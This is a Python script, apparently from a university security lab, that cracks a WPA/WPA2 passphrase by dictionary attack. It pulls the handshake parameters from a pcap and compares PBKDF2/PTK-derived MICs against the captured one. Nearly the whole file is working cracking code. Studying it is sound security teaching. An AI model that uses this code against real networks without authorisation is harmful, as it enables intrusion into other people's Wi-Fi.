#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Crack WPA passphrase from 4-way handshake using dctionnary attack

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__modified__    = "Melissa Gehring, Maxim Golay et Maëlle Vogel"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib

from scapy.contrib.wpa_eapol import WPA_key, EAPOL
from scapy.layers.dot11 import Dot11, Dot11Beacon

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Path to the dictionnary file
DICTIONNARY_FILE = 'passphrases.txt'

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 

# Important parameters for key derivation - most of them can be obtained from the pcap file
A           = "Pairwise key expansion" #this string is used in the pseudo-random function
ssid        = wpa[0][Dot11Beacon].info.decode()
ssid        = str.encode(ssid)
APmac       = a2b_hex(wpa[5][Dot11].addr2.replace(':', ''))
Clientmac   = a2b_hex(wpa[5][Dot11].addr1.replace(':', ''))

# Authenticator and Supplicant Nonces
ANonce      = wpa[5][WPA_key].nonce
SNonce      = wpa[6][WPA_key].nonce

# This is the MIC contained in the 4th frame of the 4-way handshake
# When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
target_mic  = wpa[8][WPA_key].wpa_key_mic.hex()

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
# set the MIC key to 0 before getting the data cf donnée
wpa[8][WPA_key].wpa_key_mic = 0
data        = bytes(wpa[8][EAPOL])

# Read all passphrases
with open(DICTIONNARY_FILE) as f:
    passphrases = f.readlines()

# Remove whitespace characters at the end of each line
passphrases = [ p.strip() for p in passphrases ]
print(f'Now cracking ({len(passphrases)} entries in dictionnary)...')

# Try all passphrases in the file
for passphrase in passphrases:
    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
    passphrase = str.encode(passphrase)
    pmk = pbkdf2(hashlib.sha1, passphrase, ssid, 4096, 32)

    #expand pmk to obtain PTK
    ptk = customPRF512(pmk, str.encode(A), B)

    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
    mic = hmac.new(ptk[0:16], data, hashlib.sha1)

    # Get the MIC in hex values and truncate it to the correct size
    mic = mic.hexdigest()[:32]

    if mic == target_mic:
        print(f'Passphrase found! "{passphrase.decode()}"')
        break

else:
    print('Passphrase not found... :(')